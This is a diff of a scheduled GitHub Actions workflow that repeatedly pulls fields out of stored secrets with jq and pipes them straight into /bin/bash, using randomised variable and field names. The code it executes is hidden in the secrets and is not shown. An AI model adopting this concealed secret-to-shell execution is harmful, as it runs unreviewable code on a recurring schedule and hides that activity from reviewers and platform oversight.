@@ -1,27 +1,32 @@
 name: wenhongseli
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 5/6 * * *'
+    - cron: '39 1/6 * * *'
 
-jobs:  # 7216
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wenhongseli
         env:
-          fu1890: ${{ secrets.fu1890 }}
+          orfh3189: ${{ secrets.orfh3189 }}
         run: |
-          echo $fu1890 | jq -r .mh2 | /bin/bash
-          echo $sjin119 | jq -r .ead0883 | /bin/bash
-          echo $n0387 | jq -r .yvbno92 | /bin/bash
-          echo $wba0875 | jq -r .y635 | /bin/bash
-          echo $slrr0 | jq -r .gz83 | /bin/bash
-          echo $cxkmn348 | jq -r .hmc0 | /bin/bash
-          echo $jzi6985 | jq -r .nfsv2 | /bin/bash
-          echo $dovjt64953 | jq -r .gx51991 | /bin/bash
-          echo $q4588 | jq -r .c436 | /bin/bash
-          echo $ziwkc3163 | jq -r .obdix06554 | /bin/bash
+          echo $orfh3189 | jq -r .pqxa6627 | /bin/bash
+          echo $esltb46233 | jq -r .y004 | /bin/bash
+          echo $yyvz2 | jq -r .xmn2394 | /bin/bash
+          echo $kjeub5080 | jq -r .ne5 | /bin/bash
+          echo $rek7 | jq -r .fjlpb4 | /bin/bash
+          echo $afk65 | jq -r .lkd6332 | /bin/bash
+          echo $lp803 | jq -r .r290 | /bin/bash
+          echo $jp7637 | jq -r .r64 | /bin/bash
+          echo $s6 | jq -r .ivv14289 | /bin/bash
+          echo $eveju62546 | jq -r .krap96457 | /bin/bash
+          echo $ddg5283 | jq -r .rxx083 | /bin/bash
+          echo $hswsn0 | jq -r .ko26055 | /bin/bash
+          echo $gwg00 | jq -r .hvbg32546 | /bin/bash
+          echo $y99906 | jq -r .knfu894 | /bin/bash
+          echo $awm4262 | jq -r .edfb9 | /bin/bash
 
